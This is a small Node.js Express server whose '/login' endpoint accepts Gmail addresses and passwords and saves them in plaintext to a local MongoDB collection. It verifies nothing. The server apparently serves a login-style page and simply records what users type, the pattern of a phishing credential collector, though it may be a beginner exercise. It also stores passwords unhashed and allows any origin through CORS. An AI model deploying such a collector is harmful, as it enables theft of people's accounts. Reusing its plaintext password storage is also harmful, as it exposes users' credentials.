const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'src')));

mongoose.connect('mongodb://127.0.0.1:27017/user')
  .then(() => console.log('MongoDB connection successful'))
  .catch((err) => console.log(err));

const schema = new mongoose.Schema({
  gmail: String,
  pass: String,
});

const model = new mongoose.model('deepu', schema);

const createDoc = async (gmail, pass) => {
  try {
    const data = new model({
      gmail: gmail,
      pass: pass,
    });
    const result = await data.save();
    console.log(result);
  } catch (err) {
    console.log(err);
  }
};

app.post('/login', (req, res) => {
  let body = req.body;
  let gmail = body.gmail;
  let pass = body.pass;
  createDoc(gmail, pass);
  res.send('Form data received successfully!');
});


app.listen(port, () => {
  console.log(`Listening on port: ${port}`);
});
